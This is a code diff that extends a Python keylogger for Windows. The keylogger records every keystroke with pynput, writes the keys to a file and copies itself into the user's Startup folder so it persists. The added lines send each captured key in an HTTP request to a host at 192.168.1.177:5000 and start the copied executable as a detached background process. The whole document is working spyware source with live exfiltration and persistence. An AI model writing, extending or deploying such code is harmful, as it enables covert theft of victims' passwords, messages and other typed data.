@@ -1,12 +1,23 @@
 import os
 import re
 import shutil
+import socket
+import subprocess
 import sys
+import threading
 from pathlib import Path
 
+import requests
 from pynput.keyboard import Listener
 
 line_length = 0
+
+
+def launch_request(key):
+    try:
+        requests.get(f'http://192.168.1.177:5000/hello?key={key}')
+    except Exception as e:
+        print(e)
 
 
 def key_recorder(key):
@@ -38,27 +49,34 @@ def key_recorder(key):
     else:
         print(str_key)
         f.write(str_key.replace("'", ""))
+        t = threading.Thread(target=launch_request, args=(str_key,))
+        t.start()
 
 
 def copy_to_startup_folder():
+    file_name = re.findall(r'([^\\w\d\W]+).(py|exe|pyw)', sys.argv[0])[0][0] + ".exe"
     try:
-        file_name = re.findall(r'([^\\w\d\W]+).(py|exe|pyw)', sys.argv[0])[0][0] + ".exe"
+        src = sys.argv[0]
+        dest = os.path.join(str(Path.home()), 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu',
+                            'Programs',
+                            'Startup',
+                            file_name)
 
-        shutil.copy(sys.argv[0],
-                    os.path.join(str(Path.home()), 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu',
-                                 'Programs',
-                                 'Startup',
-                                 file_name))
+        shutil.copy(src, dest)
+        subprocess.Popen(dest, shell=False, stdin=None, stdout=None, stderr=None,
+                         close_fds=True, creationflags=subprocess.DETACHED_PROCESS)
 
         return False
     except shutil.SameFileError:
         print('File is in startup folder')
+
         return True
 
 
 if __name__ == '__main__':
+    hostname = socket.gethostname()
+    host = socket.gethostbyname(hostname)
     if '.exe' in sys.argv[0]:
-
         if copy_to_startup_folder():
             with Listener(on_press=key_recorder) as listener:
                 listener.join()
